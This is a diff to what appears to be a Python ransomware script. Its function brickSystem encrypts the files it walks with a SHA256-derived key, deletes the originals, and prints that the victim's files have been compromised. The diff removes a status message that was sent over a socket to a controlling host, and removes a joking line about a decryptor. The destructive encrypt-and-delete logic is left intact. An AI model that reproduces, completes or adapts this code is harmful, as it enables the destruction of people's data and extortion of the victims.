@@ -56,7 +56,7 @@ def brickSystem(key):
         elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
             pass
         else:
-            C_socket.send("Encrypting "+str(target_file))
+         
             encrypt(SHA256.new(KEY).digest(), str(target_file))
             os.remove(target_file)
                 
@@ -340,7 +340,7 @@ def main():
     user_key = "EXAMPLE KEY :)" 
     brickSystem(user_key)
     print("Unlucky, your files have been compromised")
-    print(" Just kidding come get the decryptor " )
+   
     
 
 
